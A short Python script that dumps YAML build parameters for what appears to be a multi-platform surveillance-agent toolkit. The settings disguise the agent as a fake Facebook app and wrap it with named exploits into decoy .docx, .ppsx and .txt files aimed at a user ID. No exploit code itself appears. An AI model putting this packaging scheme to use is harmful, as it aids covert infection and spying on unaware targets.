import yaml

params = {}
demo = True

params['blackberry'] = {
    'platform': 'blackberry',
    'binary': {'demo': demo},
    'melt': {'appname': 'facebook',
             'name': 'Facebook Application',
             'desc': 'Applicazione utilissima di social network',
             'vendor': 'face inc',
             'version': '1.2.3'},
    'package': {'type': 'local'}}

params['windows'] = {
    'platform': 'windows',
    'binary': {'demo': demo, 'admin': False},
    'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
    'sign': {}
}
params['android'] = {
    'platform': 'android',
    'binary': {'demo': demo, 'admin': False},
    'sign': {},
    'melt': {}
}
params['linux'] = {
    'platform': 'linux',
    'binary': {'demo': demo, 'admin': False},
    'melt': {}
}
params['osx'] = {'platform': 'osx',
                 'binary': {'demo': demo, 'admin': True},
                 'melt': {}
}
params['ios'] = {'platform': 'ios',
                 'binary': {'demo': demo},
                 'melt': {}
}

params['exploit'] = {"generate":
                         {"platforms": ["windows"], "binary": {"demo": False, "admin": False}, "exploit": "HT-2012-001",
                          "melt": {"demo": False, "scout": True, "admin": False}}, "platform": "exploit",
                     "deliver": {"user": "USERID"},
                     "melt": {"combo": "txt", "filename": "example.txt", "appname": "agent.exe",
                              "input": "000"}, "factory": {"_id": "000"}
}

params['exploit_docx'] = {"generate":
                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                               "exploit": "HT-2013-002",
                               "melt": {"demo": False, "scout": True, "admin": False}},
                          "platform": "exploit", "deliver": {"user": "USERID"},
                          "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
                                   "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
}
params['exploit_ppsx'] = {"generate":
                              {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                               "exploit": "HT-2013-003",
                               "melt": {"demo": False, "scout": True, "admin": False}},
                          "platform": "exploit", "deliver": {"user": "USERID"},
                          "melt": {"filename": "example.ppsx", "appname": "APPNAME", "input": "000",
                                   "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
}
params['exploit_web'] = {"generate":
                             {"platforms": ["windows"], "binary": {"demo": False, "admin": False},
                              "exploit": "HT-2013-002",
                              "melt": {"demo": False, "scout": True, "admin": False}},
                         "platform": "exploit", "deliver": {"user": "USERID"},
                         "melt": {"filename": "example.docx", "appname": "APPNAME", "input": "000",
                                  "url": "http://HOSTNAME/APPNAME"}, "factory": {"_id": "000"}
}

y = yaml.dump(params)
print y